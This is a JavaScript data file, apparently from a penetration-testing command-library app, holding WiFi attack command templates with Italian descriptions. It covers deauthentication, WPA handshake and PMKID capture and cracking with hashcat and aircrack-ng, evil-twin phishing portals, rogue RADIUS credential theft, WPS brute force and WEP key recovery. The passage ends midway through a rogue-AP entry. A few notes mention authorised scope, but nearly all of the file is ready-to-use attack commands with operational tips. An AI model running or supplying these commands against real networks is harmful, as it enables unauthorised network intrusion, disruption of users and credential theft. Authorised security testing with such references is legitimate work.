// ────────────────────────────────────────────────────────────
//  WiFi discipline — command library (additive)
//  Appended to window.COMMANDS. Loaded AFTER data.js.
//  Same schema as data.js. category/subcategory ids match the
//  wifi-* categories declared in categories.js.
//  Target ctx keys: iface, mon, bssid, essid, channel, client, capfile
// ────────────────────────────────────────────────────────────

const WIFI_COMMANDS = [

  // ════════════════════════════════════════════════════════════
  //  RECON & MONITOR MODE
  // ════════════════════════════════════════════════════════════
  // ── Interface & Monitor Mode ─────────────────────────────
  {
    id: 'wifi-iw-dev', name: 'iw dev — list wireless interfaces',
    category: 'wifi-recon', subcategory: 'iface-setup', group: 'Interface',
    description: 'Elenca le interfacce wireless, il loro tipo (managed/monitor), MAC e canale. Primo comando: scopri il nome reale della scheda (`wlan0`, `wlx…`).',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['iw', 'interface', 'recon'],
    template: 'iw dev',
    params: [],
    refs: [{ label: 'iw — Linux wireless', url: 'https://wireless.wiki.kernel.org/en/users/documentation/iw' }],
  },
  {
    id: 'wifi-airmon-check', name: 'airmon-ng check kill — stop interfering procs',
    category: 'wifi-recon', subcategory: 'iface-setup', group: 'Interface',
    description: 'NetworkManager e wpa_supplicant strappano via la scheda dalla monitor mode. `check kill` li ferma. `check` da solo li elenca senza ucciderli.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['airmon-ng', 'aircrack-ng', 'monitor'],
    template: 'sudo airmon-ng check kill',
    params: [],
    variants: [
      { id: 'default', label: 'check kill', template: 'sudo airmon-ng check kill',
        description: 'Ferma NetworkManager/wpa_supplicant che interferiscono con la monitor mode.' },
      { id: 'check',   label: 'check (lista)', template: 'sudo airmon-ng check',
        description: 'Elenca soltanto i processi problematici, senza ucciderli.' },
    ],
    refs: [{ label: 'aircrack-ng — airmon-ng', url: 'https://www.aircrack-ng.org/doku.php?id=airmon-ng' }],
  },
  {
    id: 'wifi-airmon-start', name: 'airmon-ng start — enable monitor mode',
    category: 'wifi-recon', subcategory: 'iface-setup', group: 'Interface',
    description: 'Mette la scheda in monitor mode. Crea di solito `<iface>mon` (es. `wlan0mon`). Verifica poi con `iw dev` o `iwconfig` che il type sia *monitor*.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['airmon-ng', 'monitor', 'aircrack-ng'],
    template: 'sudo airmon-ng start <iface>',
    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }],
    refs: [{ label: 'aircrack-ng — airmon-ng', url: 'https://www.aircrack-ng.org/doku.php?id=airmon-ng' }],
  },
  {
    id: 'wifi-monitor-manual', name: 'iw — monitor mode (manuale, no airmon)',
    category: 'wifi-recon', subcategory: 'iface-setup', group: 'Interface',
    description: 'Abilita la monitor mode senza airmon-ng (utile su schede che non rinominano). Porta giù l’iface, cambia type in monitor, riportala su.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['iw', 'ip', 'monitor', 'manual'],
    template: 'sudo ip link set <iface> down && sudo iw <iface> set monitor control && sudo ip link set <iface> up',
    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }],
    refs: [{ label: 'Arch Wiki — monitor mode', url: 'https://wiki.archlinux.org/title/Network_configuration/Wireless' }],
  },
  {
    id: 'wifi-set-channel', name: 'iw set channel — lock a channel',
    category: 'wifi-recon', subcategory: 'iface-setup', group: 'Interface',
    description: 'Fissa la monitor iface su un canale preciso. Necessario prima di catturare un handshake (devi stare sul canale dell’AP target).',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['iw', 'channel'],
    template: 'sudo iw dev <mon> set channel <channel>',
    params: [
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
      { key: 'channel', label: 'Canale',        ctx: 'channel', placeholder: '6' },
    ],
  },
  {
    id: 'wifi-macchanger', name: 'macchanger — randomize MAC',
    category: 'wifi-recon', subcategory: 'iface-setup', group: 'Interface',
    description: 'Randomizza il MAC della scheda prima di operare (OPSEC / bypass filtri MAC). L’iface deve essere down. `-p` ripristina il MAC hardware originale.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['macchanger', 'opsec', 'mac'],
    template: 'sudo ip link set <iface> down && sudo macchanger -r <iface> && sudo ip link set <iface> up',
    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }],
    variants: [
      { id: 'default', label: 'Random', template: 'sudo ip link set <iface> down && sudo macchanger -r <iface> && sudo ip link set <iface> up',
        description: 'MAC completamente casuale.' },
      { id: 'restore', label: 'Restore', template: 'sudo ip link set <iface> down && sudo macchanger -p <iface> && sudo ip link set <iface> up',
        description: 'Ripristina il MAC hardware permanente.' },
    ],
  },
  {
    id: 'wifi-airmon-stop', name: 'airmon-ng stop — cleanup',
    category: 'wifi-recon', subcategory: 'iface-setup', group: 'Interface',
    description: 'Chiusura engagement: disabilita la monitor mode e riavvia NetworkManager per tornare online.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['airmon-ng', 'cleanup'],
    template: 'sudo airmon-ng stop <mon> && sudo systemctl start NetworkManager',
    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
  },

  // ── AP & Client Discovery ────────────────────────────────
  {
    id: 'wifi-airodump-scan', name: 'airodump-ng — scan all networks',
    category: 'wifi-recon', subcategory: 'discovery', group: 'Discovery',
    description: 'Scansione live di tutte le reti vicine: BSSID, canale (CH), cifratura (ENC/CIPHER/AUTH), potenza (PWR) e client (STATION). Da qui annoti **BSSID + canale** del target.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11', 'wpa2'],
    tags: ['airodump-ng', 'scan', 'discovery'],
    template: 'sudo airodump-ng <mon>',
    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
    variants: [
      { id: 'default', label: 'Tutte', template: 'sudo airodump-ng <mon>',
        description: 'Tutte le reti, salta tra i canali.' },
      { id: 'wpa',     label: 'Solo WPA', template: 'sudo airodump-ng --encrypt wpa <mon>',
        description: 'Filtra solo reti WPA/WPA2/WPA3.' },
      { id: 'band',    label: '5GHz + 2.4GHz', template: 'sudo airodump-ng --band abg <mon>',
        description: 'Forza la scansione su entrambe le bande (a/b/g).' },
    ],
    refs: [{ label: 'aircrack-ng — airodump-ng', url: 'https://www.aircrack-ng.org/doku.php?id=airodump-ng' }],
  },
  {
    id: 'wifi-airodump-target', name: 'airodump-ng — lock target + write capture',
    category: 'wifi-recon', subcategory: 'discovery', group: 'Discovery',
    description: 'Aggancia un singolo AP (BSSID + canale) e scrive su file. Lascialo girare: la riga **WPA handshake: \\<BSSID\\>** in alto a destra conferma la cattura.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11', 'wpa2'],
    tags: ['airodump-ng', 'capture', 'handshake'],
    template: 'sudo airodump-ng --bssid <bssid> -c <channel> -w <capfile> <mon>',
    params: [
      { key: 'bssid',   label: 'BSSID',   ctx: 'bssid',   placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'channel', label: 'Canale',  ctx: 'channel', placeholder: '6' },
      { key: 'capfile', label: 'Prefix file', ctx: 'capfile', placeholder: 'capture' },
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
    ],
    refs: [{ label: 'aircrack-ng — airodump-ng', url: 'https://www.aircrack-ng.org/doku.php?id=airodump-ng' }],
  },
  {
    id: 'wifi-kismet', name: 'kismet — passive survey',
    category: 'wifi-recon', subcategory: 'discovery', group: 'Discovery',
    description: 'Sniffer/IDS wireless con UI web (https://localhost:2501). Survey passiva, geolocalizzazione client, rilevazione reti nascoste. Ottimo per il site survey iniziale.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['kismet', 'survey', 'passive'],
    template: 'sudo kismet -c <mon>',
    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
    refs: [{ label: 'Kismet', url: 'https://www.kismetwireless.net/' }],
  },
  {
    id: 'wifi-wash', name: 'wash — WPS-enabled APs',
    category: 'wifi-recon', subcategory: 'discovery', group: 'Discovery',
    description: 'Elenca gli AP con WPS attivo e se sono *locked*. Gli AP con WPS unlocked sono candidati per Pixie-Dust / PIN bruteforce.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wps'],
    tags: ['wash', 'wps', 'reaver'],
    template: 'sudo wash -i <mon>',
    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
    refs: [{ label: 'reaver-wps-fork-t6x', url: 'https://github.com/t6x/reaver-wps-fork-t6x' }],
  },

  // ════════════════════════════════════════════════════════════
  //  HANDSHAKE & PMKID CAPTURE
  // ════════════════════════════════════════════════════════════
  // ── WPA/WPA2 Handshake ───────────────────────────────────
  {
    id: 'wifi-capture-handshake', name: 'airodump-ng — capture 4-way handshake',
    category: 'wifi-capture', subcategory: 'handshake', group: 'Capture',
    description: 'Stessa cattura mirata, qui orientata all’handshake: tieni la finestra aperta e in parallelo lancia una deauth per forzare un client a riautenticarsi.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wpa2', 'eapol'],
    tags: ['airodump-ng', 'handshake', 'eapol'],
    template: 'sudo airodump-ng --bssid <bssid> -c <channel> -w <capfile> <mon>',
    params: [
      { key: 'bssid',   label: 'BSSID',   ctx: 'bssid',   placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'channel', label: 'Canale',  ctx: 'channel', placeholder: '6' },
      { key: 'capfile', label: 'Prefix file', ctx: 'capfile', placeholder: 'handshake' },
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
    ],
  },
  {
    id: 'wifi-check-handshake', name: 'aircrack-ng — verify handshake in cap',
    category: 'wifi-capture', subcategory: 'handshake', group: 'Capture',
    description: 'Verifica che il .cap contenga davvero un handshake valido **prima** di perdere ore nel cracking. Cerca `(1 handshake)` accanto al BSSID.',
    platform: 'linux', requires: ['handshake'], protocols: ['wpa2', 'eapol'],
    tags: ['aircrack-ng', 'verify', 'handshake'],
    template: 'aircrack-ng <capfile>',
    params: [{ key: 'capfile', label: 'File .cap', ctx: 'capfile', placeholder: 'handshake-01.cap' }],
    variants: [
      { id: 'default', label: 'aircrack-ng', template: 'aircrack-ng <capfile>',
        description: 'Mostra le reti nel cap e se l’handshake è presente.' },
      { id: 'tshark',  label: 'tshark (EAPOL)', template: 'tshark -r <capfile> -Y eapol',
        description: 'Conta i frame EAPOL: servono i 4 messaggi (o almeno M1+M2) per un handshake utile.' },
    ],
  },
  {
    id: 'wifi-wifite', name: 'wifite — automated capture',
    category: 'wifi-capture', subcategory: 'handshake', group: 'Capture',
    description: 'Orchestratore automatico: monitor mode, scan, deauth, cattura handshake/PMKID e (opzionale) crack. Veloce per coprire molti AP; meno controllo del flusso manuale.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wpa2', 'pmkid'],
    tags: ['wifite', 'automated'],
    template: 'sudo wifite -i <mon> --kill',
    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
    variants: [
      { id: 'default', label: 'Auto', template: 'sudo wifite -i <mon> --kill',
        description: 'Modalità interattiva su tutte le reti.' },
      { id: 'wpa',     label: 'Solo WPA', template: 'sudo wifite -i <mon> --kill --wpa',
        description: 'Solo target WPA/WPA2 (handshake + PMKID).' },
      { id: 'essid',   label: 'Per ESSID', template: 'sudo wifite -i <mon> --kill --essid "<essid>"',
        description: 'Mira a un ESSID specifico.' },
    ],
    refs: [{ label: 'wifite2', url: 'https://github.com/derv82/wifite2' }],
  },

  // ── PMKID (clientless) ───────────────────────────────────
  {
    id: 'wifi-hcxdumptool-pmkid', name: 'hcxdumptool — capture PMKID (clientless)',
    category: 'wifi-capture', subcategory: 'pmkid', group: 'PMKID',
    description: 'Cattura il PMKID **senza alcun client connesso**, parlando direttamente con l’AP. Output `.pcapng` → poi conversione 22000. Funziona solo se l’AP espone il PMKID nel primo EAPOL.\n\n*Nota:* le opzioni variano per versione di hcxdumptool (`--enable_status`, `-F`, ecc.); su versioni recenti usa `--rds=1` per il filtro reti.',
    platform: 'linux', requires: ['no-creds'], protocols: ['pmkid', 'wpa2'],
    tags: ['hcxdumptool', 'pmkid', 'clientless'],
    template: 'sudo hcxdumptool -i <mon> -o <capfile>.pcapng --enable_status=1',
    params: [
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
      { key: 'capfile', label: 'Output (.pcapng)', ctx: 'capfile', placeholder: 'pmkid' },
    ],
    note: '# ⚠ Disabilita prima i processi interferenti\nLancia `airmon-ng check kill` prima di hcxdumptool, altrimenti il channel-hopping viene disturbato.',
    refs: [{ label: 'hcxdumptool', url: 'https://github.com/ZerBea/hcxdumptool' }],
  },
  {
    id: 'wifi-hcxdumptool-filter', name: 'hcxdumptool — target a single BSSID',
    category: 'wifi-capture', subcategory: 'pmkid', group: 'PMKID',
    description: 'Limita la cattura a un BSSID preciso via filter list, riducendo rumore e raccolta fuori scope. Crea prima un file con il MAC del target.',
    platform: 'linux', requires: ['no-creds'], protocols: ['pmkid'],
    tags: ['hcxdumptool', 'pmkid', 'filter', 'scope'],
    template: 'echo <bssid> | tr -d \':\' > bpf.list && sudo hcxdumptool -i <mon> -o <capfile>.pcapng --filterlist_ap=bpf.list --filtermode=2',
    params: [
      { key: 'bssid',   label: 'BSSID',   ctx: 'bssid', placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
      { key: 'capfile', label: 'Output (.pcapng)', ctx: 'capfile', placeholder: 'pmkid' },
    ],
    refs: [{ label: 'hcxdumptool', url: 'https://github.com/ZerBea/hcxdumptool' }],
  },

  // ── Deauth & Client Kick ─────────────────────────────────
  {
    id: 'wifi-aireplay-deauth', name: 'aireplay-ng — deauth (force re-auth)',
    category: 'wifi-capture', subcategory: 'deauth', group: 'Deauth',
    description: 'Spedisce frame di deautenticazione per buttare giù i client e forzarne la riautenticazione → cattura dell’handshake. Targetizza un client (`-c`) quando possibile invece del broadcast.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wpa2', '802.11'],
    tags: ['aireplay-ng', 'deauth'],
    template: 'sudo aireplay-ng --deauth 5 -a <bssid> -c <client> <mon>',
    params: [
      { key: 'bssid',  label: 'BSSID',  ctx: 'bssid',  placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'client', label: 'Client MAC', ctx: 'client', placeholder: '11:22:33:44:55:66' },
      { key: 'mon',    label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
    ],
    variants: [
      { id: 'default',   label: 'Targeted', template: 'sudo aireplay-ng --deauth 5 -a <bssid> -c <client> <mon>',
        description: 'Deautentica un singolo client — più chirurgico e silenzioso.' },
      { id: 'broadcast', label: 'Broadcast', template: 'sudo aireplay-ng --deauth 5 -a <bssid> <mon>',
        description: 'Deautentica tutti i client dell’AP. Rumoroso: usa pochi frame e nello scope.' },
    ],
    note: '# ⚠ Rumoroso e impattante\nLa deauth disconnette utenti reali. Mandane **pochi** (3–5), verifica che l’handshake sia catturato e fermati. Resta nello scope autorizzato.',
    refs: [{ label: 'aircrack-ng — aireplay-ng', url: 'https://www.aircrack-ng.org/doku.php?id=deauthentication' }],
  },
  {
    id: 'wifi-mdk4-deauth', name: 'mdk4 — deauth flood',
    category: 'wifi-capture', subcategory: 'deauth', group: 'Deauth',
    description: 'Alternativa più aggressiva ad aireplay per la deauth (modalità `d`). Usa una blacklist per limitare al BSSID target. Molto rumoroso — solo se aireplay non basta.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['mdk4', 'deauth', 'flood'],
    template: 'echo <bssid> > black.lst && sudo mdk4 <mon> d -b black.lst -c <channel>',
    params: [
      { key: 'bssid',   label: 'BSSID',   ctx: 'bssid',   placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'channel', label: 'Canale',  ctx: 'channel', placeholder: '6' },
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
    ],
    refs: [{ label: 'mdk4', url: 'https://github.com/aircrack-ng/mdk4' }],
  },
  {
    id: 'wifi-aireplay-test', name: 'aireplay-ng — injection test',
    category: 'wifi-capture', subcategory: 'deauth', group: 'Deauth',
    description: 'Verifica che la scheda inietti pacchetti e veda l’AP prima di tentare deauth/attacchi attivi. Se l’injection fallisce, niente attacchi attivi funzionerà.',
    platform: 'linux', requires: ['no-creds'], protocols: ['802.11'],
    tags: ['aireplay-ng', 'injection', 'test'],
    template: 'sudo aireplay-ng --test <mon>',
    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
  },

  // ════════════════════════════════════════════════════════════
  //  OFFLINE CRACKING
  // ════════════════════════════════════════════════════════════
  // ── Convert & Prep ───────────────────────────────────────
  {
    id: 'wifi-hcxpcapngtool', name: 'hcxpcapngtool — convert to 22000',
    category: 'wifi-crack', subcategory: 'convert', group: 'Convert',
    description: 'Converte la cattura (.pcapng o .cap) nel formato hashcat **22000** (WPA-PBKDF2-PMKID+EAPOL). È il passaggio obbligato tra cattura e hashcat. Riporta quanti PMKID/handshake ha estratto.',
    platform: 'linux', requires: ['handshake'], protocols: ['wpa2', 'pmkid'],
    tags: ['hcxpcapngtool', 'hashcat', '22000', 'convert'],
    template: 'hcxpcapngtool -o <capfile>.22000 <capfile>.pcapng',
    params: [{ key: 'capfile', label: 'File cattura (prefix)', ctx: 'capfile', placeholder: 'capture' }],
    note: '# Tip — converti da .cap aircrack\nFunziona anche con i `.cap` di airodump-ng: `hcxpcapngtool -o out.22000 capture-01.cap`.',
    refs: [{ label: 'hcxtools', url: 'https://github.com/ZerBea/hcxtools' }],
  },
  {
    id: 'wifi-cap2hccapx', name: 'cap2hccapx — legacy 16800/2500',
    category: 'wifi-crack', subcategory: 'convert', group: 'Convert',
    description: 'Conversione legacy verso il vecchio formato hccapx (hashcat mode 2500). Usa il 22000 quando possibile; questo serve per tool/guide datati.',
    platform: 'linux', requires: ['handshake'], protocols: ['wpa2'],
    tags: ['cap2hccapx', 'hccapx', 'legacy'],
    template: 'cap2hccapx <capfile>.cap <capfile>.hccapx',
    params: [{ key: 'capfile', label: 'File cattura (prefix)', ctx: 'capfile', placeholder: 'capture' }],
    refs: [{ label: 'hashcat-utils', url: 'https://github.com/hashcat/hashcat-utils' }],
  },

  // ── hashcat (GPU) ────────────────────────────────────────
  {
    id: 'wifi-hashcat-22000', name: 'hashcat 22000 — wordlist',
    category: 'wifi-crack', subcategory: 'hashcat', group: 'hashcat 22000',
    description: 'Attacco a dizionario sul mode **22000** (WPA-PBKDF2 EAPOL/PMKID). GPU consigliata: il PBKDF2 è lento. La PSK WPA è ≥ 8 caratteri — filtra le wordlist di conseguenza.',
    platform: 'linux', requires: ['handshake'], protocols: ['wpa2', 'pmkid'],
    tags: ['hashcat', '22000', 'wpa'],
    template: 'hashcat -m 22000 <capfile>.22000 <wordlist>',
    params: [
      { key: 'capfile',  label: 'File .22000', ctx: 'capfile', placeholder: 'capture' },
      { key: 'wordlist', label: 'Wordlist',    placeholder: '/usr/share/wordlists/rockyou.txt' },
    ],
    variants: [
      { id: 'default', label: 'Wordlist', template: 'hashcat -m 22000 <capfile>.22000 <wordlist>',
        description: 'Dizionario semplice.' },
      { id: 'rules',   label: 'Wordlist + rules', template: 'hashcat -m 22000 <capfile>.22000 <wordlist> -r /usr/share/hashcat/rules/best64.rule',
        description: 'Applica best64 per coprire mutazioni comuni (capitalizzazione, leet, anni).' },
      { id: 'mask',    label: 'Mask (8 cifre)', template: 'hashcat -m 22000 <capfile>.22000 -a 3 ?d?d?d?d?d?d?d?d',
        description: 'Bruteforce maschera: tipica per PSK numeriche (telefono, date) di 8 cifre.' },
      { id: 'show',    label: 'Show cracked', template: 'hashcat -m 22000 <capfile>.22000 --show',
        description: 'Mostra le PSK già crackate dal potfile.' },
    ],
    refs: [{ label: 'hashcat — example hashes (22000)', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' }],
  },
  {
    id: 'wifi-hashcat-16800', name: 'hashcat 16800/2500 — legacy modes',
    category: 'wifi-crack', subcategory: 'hashcat', group: 'hashcat legacy',
    description: 'Mode legacy: 16800 (PMKID) e 2500 (handshake hccapx). Deprecati a favore del 22000 ma ancora citati in molte guide.',
    platform: 'linux', requires: ['pmkid'], protocols: ['wpa2', 'pmkid'],
    tags: ['hashcat', '16800', '2500', 'legacy'],
    template: 'hashcat -m 16800 <capfile>.16800 <wordlist>',
    params: [
      { key: 'capfile',  label: 'File hash', ctx: 'capfile', placeholder: 'capture' },
      { key: 'wordlist', label: 'Wordlist',  placeholder: '/usr/share/wordlists/rockyou.txt' },
    ],
    variants: [
      { id: 'default', label: '16800 (PMKID)', template: 'hashcat -m 16800 <capfile>.16800 <wordlist>',
        description: 'Vecchio formato PMKID.' },
      { id: '2500',    label: '2500 (hccapx)', template: 'hashcat -m 2500 <capfile>.hccapx <wordlist>',
        description: 'Vecchio formato handshake hccapx.' },
    ],
  },

  // ── aircrack-ng (CPU) ────────────────────────────────────
  {
    id: 'wifi-aircrack-crack', name: 'aircrack-ng — dictionary crack (CPU)',
    category: 'wifi-crack', subcategory: 'aircrack', group: 'aircrack-ng',
    description: 'Crack a dizionario direttamente sul .cap, senza conversione. Comodo per dizionari piccoli e check rapidi; per wordlist grandi usa hashcat su GPU.',
    platform: 'linux', requires: ['handshake'], protocols: ['wpa2'],
    tags: ['aircrack-ng', 'crack', 'cpu'],
    template: 'aircrack-ng -w <wordlist> -b <bssid> <capfile>.cap',
    params: [
      { key: 'wordlist', label: 'Wordlist', placeholder: '/usr/share/wordlists/rockyou.txt' },
      { key: 'bssid',    label: 'BSSID',    ctx: 'bssid', placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'capfile',  label: 'File .cap', ctx: 'capfile', placeholder: 'handshake-01' },
    ],
    refs: [{ label: 'aircrack-ng', url: 'https://www.aircrack-ng.org/doku.php?id=aircrack-ng' }],
  },

  // ════════════════════════════════════════════════════════════
  //  ACTIVE ATTACKS
  // ════════════════════════════════════════════════════════════
  // ── Evil Twin / Rogue AP ─────────────────────────────────
  {
    id: 'wifi-eaphammer-psk', name: 'eaphammer — Evil Twin (WPA2-PSK captive)',
    category: 'wifi-attacks', subcategory: 'evil-twin', group: 'Evil Twin',
    description: 'Crea un gemello dell’ESSID target con captive portal: i client si connettono e inseriscono la PSK, che viene catturata. Combina con una deauth per spingerli sul tuo AP.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wpa2'],
    tags: ['eaphammer', 'evil-twin', 'captive-portal'],
    template: 'sudo eaphammer -i <mon> --essid "<essid>" --captive-portal',
    params: [
      { key: 'mon',   label: 'Interfaccia', ctx: 'mon', placeholder: 'wlan0' },
      { key: 'essid', label: 'ESSID target', ctx: 'essid', placeholder: 'CORP-WIFI' },
    ],
    note: '# ⚠ Solo nello scope\nL’Evil Twin intercetta utenti reali e raccoglie credenziali: assicurati che rientri esplicitamente nelle regole d’ingaggio.',
    refs: [{ label: 'eaphammer', url: 'https://github.com/s0lst1c3/eaphammer' }],
  },
  {
    id: 'wifi-wifiphisher', name: 'wifiphisher — rogue AP phishing',
    category: 'wifi-attacks', subcategory: 'evil-twin', group: 'Evil Twin',
    description: 'Framework di rogue AP con template di phishing (pagina firmware update, login OAuth, ecc.). Automatizza deauth + AP + portale.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wpa2'],
    tags: ['wifiphisher', 'rogue-ap', 'phishing'],
    template: 'sudo wifiphisher -aI <mon> -eI <iface> -e "<essid>"',
    params: [
      { key: 'mon',   label: 'AP iface (mon)', ctx: 'mon', placeholder: 'wlan0' },
      { key: 'iface', label: 'Uplink iface',   ctx: 'iface', placeholder: 'wlan1' },
      { key: 'essid', label: 'ESSID',          ctx: 'essid', placeholder: 'CORP-WIFI' },
    ],
    refs: [{ label: 'wifiphisher', url: 'https://github.com/wifiphisher/wifiphisher' }],
  },

  // ── WPS ──────────────────────────────────────────────────
  {
    id: 'wifi-reaver-pixie', name: 'reaver — Pixie-Dust (offline WPS)',
    category: 'wifi-attacks', subcategory: 'wps', group: 'WPS',
    description: 'Attacco Pixie-Dust: sfrutta la debole entropia del nonce in molti chipset per recuperare il PIN WPS **offline**, in secondi/minuti. Prova sempre questo prima del PIN bruteforce.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wps'],
    tags: ['reaver', 'pixie-dust', 'wps'],
    template: 'sudo reaver -i <mon> -b <bssid> -c <channel> -K 1 -vv',
    params: [
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
      { key: 'bssid',   label: 'BSSID',   ctx: 'bssid',   placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'channel', label: 'Canale',  ctx: 'channel', placeholder: '6' },
    ],
    refs: [{ label: 'reaver-wps-fork-t6x', url: 'https://github.com/t6x/reaver-wps-fork-t6x' }],
  },
  {
    id: 'wifi-reaver-pin', name: 'reaver — PIN bruteforce',
    category: 'wifi-attacks', subcategory: 'wps', group: 'WPS',
    description: 'Bruteforce online del PIN WPS a 8 cifre (in realtà ~11k tentativi per la struttura del PIN). Lento e rumoroso; molti AP fanno lock dopo N tentativi. Fallback se Pixie-Dust fallisce.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wps'],
    tags: ['reaver', 'wps', 'bruteforce'],
    template: 'sudo reaver -i <mon> -b <bssid> -c <channel> -vv -d 15 -T 1',
    params: [
      { key: 'mon',     label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
      { key: 'bssid',   label: 'BSSID',   ctx: 'bssid',   placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'channel', label: 'Canale',  ctx: 'channel', placeholder: '6' },
    ],
    variants: [
      { id: 'default', label: 'reaver', template: 'sudo reaver -i <mon> -b <bssid> -c <channel> -vv -d 15 -T 1',
        description: 'PIN bruteforce con delay anti-lock.' },
      { id: 'bully',   label: 'bully', template: 'sudo bully -b <bssid> -c <channel> <mon>',
        description: 'Implementazione alternativa (bully), a volte più stabile su certi AP.' },
    ],
  },

  // ── WEP (legacy) ─────────────────────────────────────────
  {
    id: 'wifi-wep-arpreplay', name: 'aireplay-ng — WEP ARP replay (IV boost)',
    category: 'wifi-attacks', subcategory: 'wep', group: 'WEP',
    description: 'Accelera la raccolta di IV su una rete WEP iniettando ARP catturati. In parallelo airodump scrive il .cap; con ~20–80k IV aircrack recupera la chiave.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wep'],
    tags: ['aireplay-ng', 'wep', 'arp-replay'],
    template: 'sudo aireplay-ng --arpreplay -b <bssid> -h <client> <mon>',
    params: [
      { key: 'bssid',  label: 'BSSID',  ctx: 'bssid',  placeholder: 'AA:BB:CC:DD:EE:FF' },
      { key: 'client', label: 'MAC associato', ctx: 'client', placeholder: '11:22:33:44:55:66' },
      { key: 'mon',    label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' },
    ],
  },
  {
    id: 'wifi-wep-crack', name: 'aircrack-ng — crack WEP key',
    category: 'wifi-attacks', subcategory: 'wep', group: 'WEP',
    description: 'Recupera la chiave WEP dagli IV catturati. WEP è rotto by-design: bastano abbastanza IV. Output: chiave HEX/ASCII.',
    platform: 'linux', requires: ['no-creds'], protocols: ['wep'],
    tags: ['aircrack-ng', 'wep'],
    template: 'aircrack-ng <capfile>.cap',
    params: [{ key: 'capfile', label: 'File .cap', ctx: 'capfile', placeholder: 'wep-01' }],
  },

  // ════════════════════════════════════════════════════════════
  //  WPA-ENTERPRISE (802.1X)
  // ════════════════════════════════════════════════════════════
  // ── EAP Recon ────────────────────────────────────────────
  {
    id: 'wifi-eap-identify', name: 'airodump-ng — spot WPA-Enterprise',
    category: 'wifi-enterprise', subcategory: 'eap-recon', group: 'EAP Recon',
    description: 'Nelle reti WPA-Enterprise la colonna AUTH di airodump mostra **MGT** (802.1X) invece di PSK. Identifica i target enterprise prima di montare un rogue RADIUS.',
    platform: 'linux', requires: ['no-creds'], protocols: ['eap', '802.11'],
    tags: ['airodump-ng', 'enterprise', '802.1x'],
    template: 'sudo airodump-ng --encrypt wpa <mon>',
    params: [{ key: 'mon', label: 'Monitor iface', ctx: 'mon', placeholder: 'wlan0mon' }],
  },
  // ── Rogue RADIUS / Cred Capture ──────────────────────────
  {
    id: 'wifi-eaphammer-rogue', name: 'eaphammer — rogue RADIUS (steal MSCHAPv2)',
    category: 'wifi-enterprise', subcategory: 'rogue-radius', group: 'Rogue RADIUS',
    description: 'Monta un AP WPA-Enterprise fasullo che accetta qualsiasi credenziale e cattura le challenge/response MSCHAPv2 dei client. Efficace quando i client NON validano il certificato del server RADIUS.',
    platform: 'linux', requires: ['no-creds'], protocols: ['eap', 'wpa2'],
    tags: ['eaphammer', 'enterprise', 'mschapv2', 'rogue'],
    template: 'sudo eaphammer -i <mon> --essid "<essid>" --auth wpa-eap --creds',
    params: [
      { key: 'mon',   label: 'Interfaccia', ctx: 'mon', placeholder: 'wlan0' },
      { key: 'essid', label: 'ESSID target', ctx: 'essid', placeholder: 'CORP-ENT' },
    ],
    note: '# Genera prima il certificato\n`eaphammer --cert-wizard` crea il certificato del server usato dal rogue AP.',
    refs: [{ label: 'eaphammer', url: 'https://github.com/s0lst1c3/eaphammer' }],
  },
  {
    id: 'wifi-hostapd-wpe', name: 'hostapd-wpe — rogue enterprise AP',
